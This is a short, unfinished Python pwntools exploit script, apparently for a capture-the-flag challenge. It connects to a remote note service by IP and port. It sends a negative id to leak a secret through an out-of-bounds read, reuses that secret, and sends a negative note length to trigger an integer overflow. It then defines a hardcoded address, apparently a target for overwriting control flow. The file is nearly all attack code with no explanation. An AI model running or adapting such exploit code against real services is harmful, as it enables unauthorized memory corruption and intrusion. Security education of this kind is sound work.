from pwn import *

rem = remote('140.113.194.66', 8787)
###########################################################
recv_data = rem.recvuntil('Your choice: ',drop = False)
rem.sendline('1')
recv_data = rem.recvuntil('Please input id: ',drop = False)
rem.sendline('-1')
recv_data = rem.recvuntil('Age: ',drop = False)
secret_info = rem.recvline(keepends = False)
print(recv_data)
############################################################
recv_data = rem.recvuntil('Your choice: ',drop = False)
rem.sendline('2')
recv_data = rem.recvuntil('Please input secret first: ',drop = False)
rem.sendline(secret_info)
recv_data = rem.recvuntil('Please input id: ',drop = False)
rem.sendline('1')
recv_data = rem.recvuntil('Input new note length: ',drop = False)
rem.sendline('-1')
#############################################################
magic1_addr = "\xe0\x89\x04\x08"
# rem.interactive()
# rem.send('-1\r\n')
